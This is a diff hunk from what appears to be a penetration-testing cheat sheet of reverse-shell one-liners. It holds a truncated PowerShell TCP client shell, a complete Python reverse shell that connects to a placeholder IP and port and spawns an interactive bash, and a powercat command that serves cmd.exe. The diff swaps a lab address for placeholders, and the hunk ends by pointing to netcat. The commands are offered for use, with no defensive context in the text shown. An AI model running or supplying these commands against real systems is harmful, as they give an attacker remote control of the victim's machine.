@@ -3,7 +3,7 @@ powershell -c "$client = New-Object System.Net.Sockets.TCPClient("IP",PORT);$str
 or<br />
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);' (via python) 
 or<br />
-powercat -c 10.11.0.4 -p 443 -e cmd.exe (via powercat)<br />
+powercat -c "IP" -p PORT -e cmd.exe (via powercat)<br />
 or<br />
 simply use netcat
 ## first move to a powershell:-
